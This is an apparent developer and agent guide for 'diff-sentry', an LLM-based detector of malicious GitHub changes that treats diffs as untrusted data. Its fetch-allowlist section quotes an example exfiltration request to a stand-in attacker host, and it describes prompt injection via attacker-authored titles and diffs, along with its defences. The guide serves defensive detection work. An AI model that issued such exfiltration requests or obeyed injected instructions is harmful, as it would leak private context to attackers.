# diff-sentry — agent guide

A **BewAIre-style malicious-change detector** built on `rlm-kit` — a downstream consumer of the RLM
scaffold, alongside `cve-reverser`. It classifies ONE GitHub change (PR/issue/push)
for malicious intent: the diff is UNTRUSTED DATA held in a sandboxed REPL, the planner SUBMITs a
judgement-only verdict, and the deterministic indicator EVIDENCE is unioned on read into a SIEM signal.
rlm-kit is consumed as a **commit-pinned git source** (`[tool.uv.sources]` → GitHub, `uv.lock` pins the
commit — like the siblings); never pip-install it, and overlay `uv pip install -e ../rlm-kit` only when
co-developing the kit locally. See
`README.md` for the pipeline table + the honest caveats (prompt-injection residual, deep-tier scale),
and rlm-kit's **"Building a consumer"** for the extension contract this project lives within.

One companion rule ships under `.claude/rules/`:

- `@.claude/rules/handoff.md` — what must survive context compaction. Read it before auto-compacting.

## Verify

- `uv run pytest` — the full offline suite (`uv sync --group dev` first). No live LLM, no network, no
  Deno: dspy-bearing paths use DummyLM / rlm-kit's `ScriptedInterpreter` (the offline forward path),
  transports are injected fakes, and the detection-quality corpus (`tests/corpus/`) pins the indicator
  suite's hit/miss behavior.
- The **eval** member (`eval/`, the `diff-sentry-eval` workspace package) has its OWN offline suite —
  `uv run --package diff-sentry-eval --extra dev python -m pytest eval/tests` (a plain root `uv run`
  won't install the member; the `--package` is load-bearing, and CI gets it via `uv sync --all-packages`).
  It is a ONE-WAY reader of the trace / assembled-verdict contract (a reward-free MEASUREMENT scorer — see
  `eval/README.md`); run it when you touch `assemble.py`, `rl_export.py`, `rubric.py`, `schema.py`, or the
  trace payloads it scores.
- `uvx ruff check .` — lint (ruff defaults, line-length 110). Not part of the pytest suite; CI gates it
  as its own job (`.github/workflows/ci.yml` — both suites + node tests + ruff, mirroring the siblings),
  so keep it green locally too.
- A *live* run needs role creds (`DS_*`, see `.env.example`), a Deno sandbox (`brew install deno`), and
  `gh` for `pr`/`issue` ingest. `render`/`export` are fully offline; `classify` ingests offline but
  classifies live.

## Running — always through the CLI

- **Run via `cli` (`pr` / `issue` / `classify`), never an ad-hoc script.** `cli.run(event, …)` is THE
  programmatic entry: it resets + records `<out>/traces/{run_id}.jsonl` (TraceRecorder appends — a
  re-run drops the stale file first), writes `<out>/responses/{run_id}.json`, and emits the SIEM signal
  host-side AFTER the run. It NEVER raises on a failed run — a crash still writes an informative
  `status=failed` response that can still signal off the evidence floor. Don't drive
  `detect_from_event` / `build_response` from a private script — extend `cli.py`.
- Offline re-derivation: `python -m diff_sentry render <trace> <run_id>` re-renders a response;
  `python -m diff_sentry export "output/traces/*.jsonl" ds.json` exports the reward-free dataset.

## Hard invariants — do not break

- **The change is DATA — read, never execute.** The untrusted content is a REPL variable the planner
  explores (decode base64, inspect filenames) under the default `pyodide` interpreter. Nothing in the
  change is ever run, built, or fetched-and-run; an embedded instruction is a `prompt-injection`
  SIGNAL to record, never a command. Detection is static; never route the interpreter to `local`.
- **Judgement-only SUBMIT; evidence is unioned on read (MF3).** The planner's `ChangeVerdict` has NO
  hits field — it structurally cannot write, hide, or invent evidence; it may only CITE ids
  (`indicator_ids`). `assemble.assemble_verdict` re-sources the UNION of ALL hits from the trace
  (run_start `baseline_indicators` ∪ every `scan_indicators` tool_call) and derives `signal`
  deterministically: verdict ∈ `emit_on` OR max severity ≥ the high/critical floor
  (`SIGNAL_SEVERITY_FLOOR`). A false-benign self-report can skew the VERDICT, never suppress the
  EVIDENCE; a cited id with no recorded hit lands in `cited_unknown_ids` (a fabrication tell). This
  assembly runs at EVERY read path — live (`cli`), re-render, and `rl_export` — so labels are facts.
  Do NOT add a hits/severity/signal field to the SUBMIT type or a second signal derivation.
- **MF1 — the metadata sandwich in `normalize_event`.** dspy surfaces a ~1000-char head+tail PREVIEW
  of the input into the prompt, so the derived-metadata header AND identical footer deny the attacker
  the preview edges, and attacker-authored fields inside the metadata (title, filenames) are BOUNDED
  (`_MAX_META_*`). The MISSION frame + an injection-resistant planner are the actual defense of the
  untrusted middle. Don't flatten the sandwich or unbound the caps. The title/author ride in
  `raw_content` so the host-side BASELINE catches a title-borne injection even when the planner is
  skewed by that same payload.
- **MF2 — enrichment fetch is GitHub-allowlisted and OFF by default** (`enable_fetch=False`). The
  input is attacker-authored, so an injected instruction could steer a fetcher into
  `GET https://attacker.tld/?leak=<context>` — the kit's SSRF guard blocks INTERNAL targets; the host
  allowlist (`github_hosts`) blocks EXTERNAL ones too, re-checked (allowlist + resolved-IP) on every
  redirect hop. Never add a general-purpose fetch or fetch a URL the change names.
  `fetch_allow_cidrs` is ONLY the fake-IP-proxy/split-DNS escape hatch at the resolved-IP layer; the
  syntactic guard still refuses localhost/metadata.
- **Indicators are deterministic, pure-Python, in-loop-safe — NO subprocess.** A subprocess spawned
  inside the live dspy.RLM/asyncio process reliably hangs (a hard-won consumer lesson); any heavier
  scanner belongs host-side, post-run. `mint_id` is deterministic (sha1 over rule+evidence, no
  Date/random) so a baseline hit and a tool re-scan of the same content dedupe to ONE union member.
  Severities are TUNED, not monotone-paranoid: a plain workflow-file edit is `medium` — BELOW the
  signal floor — ON PURPOSE (a benign workflow PR must not force a SIEM signal; a real payload inside
  the workflow fires the high/critical shell/obfuscation rules itself), while a CODEOWNERS
  reassignment is `high` (the hackerbot-claw move). The corpus pins this hit/miss behavior. Hit
  evidence is a BOUNDED snippet (`_MAX_EVIDENCE`), never the whole diff.
- **The indicator tool registers as exactly `scan_indicators`.** dspy registers a tool under its
  `__name__` and the prompt says `scan_indicators(region)` — a rename makes every sandbox call a
  NameError (a shipped regression; see the `fix(detect)` commit). The inner callable is renamed on
  purpose; keep it.
- **Models are ROLES, configured by env** (`DS_ROOT_LM` planner / `DS_SUB_LM` analyst /
  `DS_CLASSIFIER_LM` classifier, defaulting to the analyst). Refer to them by role in code, docs, and
  the prompt. No hardcoded model name.
- **The budget is HARD — `max_retries=1`, no whole-RLM retry** (set in `detect.setup`). One change =
  one trajectory, so the trace stays valid training data. An `RLMTaskError` is almost always infra (a
  planner-endpoint hiccup / an adapter parse failure), NOT a schema bug — check the endpoint first.
- **A second model-judgement is a TOOL, never the sub-LM.** `deep_classify` is the swappable
  second-stage SEAM, built on rlm-kit's `make_model_tool` (chat → transient-retry → validate →
  circuit-break) — the planner CHOOSES to consult it, so the decision is a `tool_call` in the
  trajectory. The analyst intercept (`intercept_sub_lm`) is tracing-only, ZERO transforms — never
  smuggle a judgement into it. Swapping the backend touches ONLY `classify_backend` /
  `_selfclassify_chat`; the planner, schema, assemble, and export stay untouched. Its distilled-input
  contract holds: the planner passes findings, NEVER the whole diff.
- **GitHub ingest and SIEM emission are host-side plumbing, never planner tools.** The planner never
  talks to GitHub (`ingest.py` shells out to `gh` HOST-SIDE only; transport injectable) and never
  holds SIEM creds — `emit.emit_signal` POSTs after the run, stays OUT of the trajectory, and NEVER
  raises (a SIEM outage cannot sink a finished classification). Only choices the policy MAKES are
  tools; writing/sending a finished deliverable is plumbing (the cve-reverser publish rule).
- **This is a ROLLOUT source — trajectories, NOT reward.** `rl_export` passes `reward=None`; labels
  read the ASSEMBLED verdict (facts, e.g. `signal`, `cited_unknown`) and metrics are objective effort
  counters. Reward/credit-assignment/GRPO are a separate project. The classifier-vs-orchestrator
  split is load-bearing: `deep_classify` tool_calls train the CLASSIFIER; every other action is the
  planner's. A prompt/policy rule that improves rollout quality is in scope; a reward is not.
- **The ATLAS rubric is a REWARD-FREE LABEL surface — a FIXED, no-LLM skeleton.** `rl_export.rubric_signal`
  attaches, per run, the ATLAS 4-category (TF/TA/TG/PA) decomposition carried as LABELS in `run_start` meta
  (`rubric_to_meta(default_rubric())` — a deterministic skeleton, one criterion per category, since
  diff-sentry's task is constant; there is NO `generate_rubric` LLM path) PLUS deterministic per-criterion
  `criteria_facts`. Those facts are a RE-LENS over `run_labels`/`run_metrics` (NOT a second derivation —
  `rubric.trace_facts` reuses them via a lazy import, so a criterion's `observed` can never drift from the
  labels/metrics a trainer reads), and stay reward-free (`CriterionFact` has NO score/met field — the
  trainer scores dᵢ). `rubric.py` is a dspy-free LEAF (imports only `.schema` at top; the rl_export reuse
  is a function-level import). The `_CATEGORY_LENS` maps each category to diff-sentry's OWN keys —
  TF↔(verdict/signal/hit_iteration_cap), TA↔(scan/deep_classify/analyst/fetch/skill counts + circuit-breaks),
  TG↔(indicator_count/max_indicator_severity/signal/cited_unknown), PA↔(verdict/cited_unknown). The response
  (`response._rubric`) surfaces it as `DetectionResponse.rubric` (a `RubricReport`), and the studio shows it
  as a "labels — not a score" card — presentation only, adding NO judgement (the facts already ride
  `rubric_signal`). Do NOT add a reward/score/met field to any rubric type, and keep the studio card
  legacy-guarded (a response without a `rubric` renders nothing).
- **The eval member measures; it never rewards (the one-way fence).** `eval/` (`diff-sentry-eval`) is a
  workspace member that scores a recorded run's assembled VERDICT with a fixed external ATLAS LLM-as-judge
  (TF/TA/TG/PA, 0–10, TF primary, per-category MEANS only — no composite, no threshold). It is a ONE-WAY
  reader of the trace contract, reaching diff-sentry ONLY through its public surface (`verdict_from_events`
  / `run_labels` / `run_metrics` / `AssembledVerdict`), and `diff_sentry` NEVER imports `diff_sentry_eval`
  (test-enforced, `eval/tests/test_boundary.py`). The judge is deliberately RUBRIC-FREE (a generic prompt —
  it never reads `rubric_signal`, which would bias the measure) and holds read-never-execute (it assesses
  the classification statically, treating the change as untrusted). A run it cannot score (never finalized /
  no usable verdict / judge failed) is `unscored`, never a fake 0. Keep it reward-free and out of the
  rollout core — see `eval/README.md`.
- **Attack knowledge lives in `diff_sentry/skills/`, not the prompt.** Progressive disclosure
  (`load_skills_as_tools(discovery="inject")`): the catalog is injected, `read_skill(name)` pulls a
  body JIT. Fix a wrong convention by editing/adding a skill, NOT by bloating `detect.INSTRUCTIONS`
  (identity + MISSION frame + tool cost-model + triage loop + output-gating rules only). Skills ship
  in the wheel via `packages = ["diff_sentry"]` — do NOT add a force-include (it duplicates them and
  breaks the build).
- **Keep the dspy-free modules dspy-free.** `config.py`, `schema.py`, `normalize.py`,
  `indicators.py`, `assemble.py`, `response.py`, `emit.py`, `ingest.py`, `rl_export.py`, `rubric.py` must
  not import dspy at module top; `import diff_sentry` must not import dspy (`ClassifyChange` / `setup` /
  `run` / `detect_from_event` are lazy PEP 562 re-exports). `rubric.py` imports only `.schema` at top; its
  `rl_export` reuse (for `trace_facts`) is a FUNCTION-LEVEL import — that call path (rl_export → assemble →
  indicators) is itself dspy-free, so `response.py` importing `rubric` at top stays clean. The Claude-subscription adapter is now
  `rlm_kit.ClaudeAgentLM` (promoted INTO the rlm-kit wheel — no longer vendored here); it is
  dspy/SDK-bearing BY DESIGN and imported LAZILY (`from rlm_kit import ClaudeAgentLM`, only inside
  `detect.setup()`'s `claude-agent-sdk/` sentinel branch, via `_maybe_subscription_lm`) and never from
  `__init__.py`, so `import diff_sentry` stays dspy-free.
  The classifier NEVER runs on the subscription (its model may not carry the `claude-agent-sdk/`
  sentinel — `config.from_env` rejects it, explicit or inherited); mixed auth is by design.
- **The trace self-describes the run.** `run_start` meta carries the normalized event, the
  instructions, the source echo, `baseline_indicators`, `emit_on`, the role→model names, the
  budgets, and the ATLAS `rubric` skeleton — so an offline re-render/export re-derives the SAME `signal`
  the live run emitted (`emit_on` is read from meta, never from current config), `hit_iteration_cap` uses
  the run's own cap, and the rubric facts name the SAME criteria they were computed against. Any new
  per-run config that affects read-time derivation MUST ride in meta.

## Layout / promotion

- Base/wrap split: the generic chat→retry→validate→circuit-break core is rlm-kit's `make_model_tool`
  (`deep_classify` is the project wrapper: backend + JSON validator + messages + tracing); the SSRF
  primitives (`is_safe_url`, `resolved_host_is_safe`, `parse_cidrs`) are the kit's (`fetch_tool` owns
  the GitHub allowlist + the httpx provider + tracing).
- When this consumer forces a workaround, log the **reusable** gap and fix it in rlm-kit generically —
  never special-case diff-sentry there. Consumer values (`DS_*` roles, the verdict schema, indicator
  rules, the SIEM payload shape) stay HERE.
- The cheap pre-filter tier (deterministic indicators + one small single-shot call in front of the
  RLM) and live GitHub/SIEM wiring are the next increments — the pre-filter is HOST-SIDE plumbing in
  front of `cli.run`, not extra RLM turns.
- **Two in-repo workspace members, never in the `diff_sentry` wheel:** `studio/` (the detection console,
  `diff-sentry-studio`, behind its `live` extra) and `eval/` (the reward-free scorecard,
  `diff-sentry-eval`, a one-way trace reader). Both read this package's trace / `DetectionResponse`
  contract via its PUBLIC surface only (never a fork), so co-locating keeps reader + producer in sync;
  keep the root wheel `packages = ["diff_sentry"]` so `uv build` never sweeps them in. Both are registered
  in the root `[tool.uv.workspace] members` and resolve `diff-sentry = { workspace = true }`.

## Versioning

- Keep `pyproject.toml` `[project].version` and `diff_sentry.__version__` in sync.
